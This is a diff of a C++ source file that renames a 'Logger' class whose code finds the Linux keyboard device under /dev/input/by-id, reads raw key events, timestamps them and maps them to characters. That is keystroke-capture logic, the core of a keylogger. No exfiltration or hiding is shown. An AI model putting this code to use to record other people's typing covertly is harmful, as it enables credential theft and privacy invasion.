@@ -16,29 +16,27 @@
 #include <unistd.h>
 #include <utility>
 
-Logger& Logger::get_instance() {
-	static Logger instance;
+logger& logger::get_instance() {
+	static logger instance;
 	return instance;
 }
 
-Logger::Logger()
+logger::logger()
 : fd_(-1)
 , initialized_(false)
 , running_(false)
-, keymap_(load_keymap("keymap.json")) {
-	return;
-}
+, keymap_(load_keymap("keymap.json")) {}
 
-Logger::~Logger() {
+logger::~logger() {
 	if (fd_ != -1) {
 		close(fd_);
 	}
 }
 
-auto Logger::init(std::string const& event_ID) -> bool {
+auto logger::init(std::string const& event_ID) -> bool {
 	if (check_init()) {
 		std::cerr << "logger (init): logger process ID {" << ev_init_ << "}." << std::endl;
-		return true;
+		return false;
 	}
 
 	std::string device = event_ID;
@@ -61,9 +59,9 @@ auto Logger::init(std::string const& event_ID) -> bool {
 	return true;
 }
 
-auto Logger::check_init() const -> bool { return initialized_; }
+auto logger::check_init() const -> bool { return initialized_; }
 
-auto Logger::start() -> void {
+auto logger::start() -> void {
 	if (!check_init()) {
 		std::cerr << "logger (start): not initialized." << std::endl;
 		return;
@@ -78,7 +76,7 @@ auto Logger::start() -> void {
 	ev_reader();
 }
 
-auto Logger::kill() -> void {
+auto logger::kill() -> void {
 	running_ = false;
 	if (fd_ != -1) {
 		close(fd_);
@@ -88,7 +86,7 @@ auto Logger::kill() -> void {
 	ev_init_.clear();
 }
 
-auto Logger::
+auto logger::
   load_keymap(const std::string& config) -> std::unordered_map<unsigned int, std::pair<std::string, std::string>> {
 	std::unordered_map<unsigned int, std::pair<std::string, std::string>> tmp;
 	std::ifstream                                                         conf(config);
@@ -110,7 +108,7 @@ auto Logger::
 	return tmp;
 }
 
-auto Logger::fd_monitor(signed int fd, fd_set fds) -> signed int {
+auto logger::fd_monitor(signed int fd, fd_set fds) -> signed int {
 	struct timeval timeout;
 	timeout.tv_sec  = 1;
 	timeout.tv_usec = 0;
@@ -121,7 +119,7 @@ auto Logger::fd_monitor(signed int fd, fd_set fds) -> signed int {
 	return select(fd + 1, &fds, nullptr, nullptr, &timeout);
 }
 
-auto Logger::datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
+auto logger::datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
 	char date[11], time[13];
 
 	std::tm* tv = std::localtime(&tv_sec);
@@ -131,7 +129,7 @@ auto Logger::datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
 	return std::make_pair(std::string{date}, std::string{time});
 }
 
-auto Logger::find_kbd() -> std::string {
+auto logger::find_kbd() -> std::string {
 	std::string       device_path;
 	const std::string hardware_path = "/dev/input/by-id";
 	const std::string kbd_id        = "-event-kbd";
@@ -199,7 +197,7 @@ auto Logger::find_kbd() -> std::string {
 	return device_path;
 }
 
-auto Logger::ev_reader() -> void {
+auto logger::ev_reader() -> void {
 	struct input_event                  ev;
 	ssize_t                             n;
 	std::pair<std::string, std::string> dtg;
@@ -231,7 +229,7 @@ auto Logger::ev_reader() -> void {
 	}
 }
 
-auto Logger::get_keychar(unsigned int code) -> std::string {
+auto logger::get_keychar(unsigned int code) -> std::string {
 	auto it = keymap_.find(code);
 	if (it != keymap_.end()) {
 		return it->second.second.data();
